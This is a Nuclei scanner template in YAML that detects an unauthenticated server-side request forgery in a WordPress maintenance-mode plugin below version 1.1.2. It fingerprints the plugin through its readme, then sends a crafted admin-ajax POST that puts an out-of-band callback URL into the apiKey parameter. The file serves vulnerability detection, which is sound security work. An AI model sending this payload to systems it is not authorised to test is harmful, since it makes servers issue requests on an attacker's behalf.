id: wp-under-construction-ssrf

info:
  name: Under Construction, Coming Soon & Maintenance Mode < 1.1.2 - Server Side Request Forgery (SSRF)
  author: Akincibor
  severity: high
  description: |
    The includes/mc-get_lists.php file used the 'apiKey' POST parameter to create an https URL from it without sanitisation and called it with cURL, leading to a SSRF issue. The issue is exploitable via direct access to the affected file, and ucmm_mc_api AJAX call (available to both authenticated and unauthenticated users).
  reference:
    - https://wpscan.com/vulnerability/24784c84-3efd-4166-81c1-e5a266562cfc
    - https://packetstormsecurity.com/files/161576/
  metadata:
    verified: true
    max-request: 2
  tags: ssrf,wp,wp-plugin,wordpress,unauth,wpscan,packetstorm

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET /wp-content/plugins/under-construction-maintenance-mode/readme.txt HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        internal: true
        words:
          - '= Under Construction'

  - raw:
      - |
        POST /wp-admin/admin-ajax.php HTTP/2
        Host: {{Hostname}}
        Origin: {{BaseURL}}
        Content-Type: application/x-www-form-urlencoded

        action=ucmm_mc_api&apiKey=-{{interactsh-url}}%2Ftest%2Ftest%2Ftest%3Fkey1%3Dval1%26dummy%3D

    matchers:
      - type: word
        part: interactsh_protocol # Confirms the HTTP Interaction
        words:
          - "http"
# digest: 4b0a004830460221008074a13573b9b900ffac5ec977388266c28c4a0c4f75f6ad7e1c6c43d05db71e022100a6c7675a83457b80e7be81c516871db553d0984f44cc783a7f6a8f933de56557:922c64590222798bb761d5b6d8e72950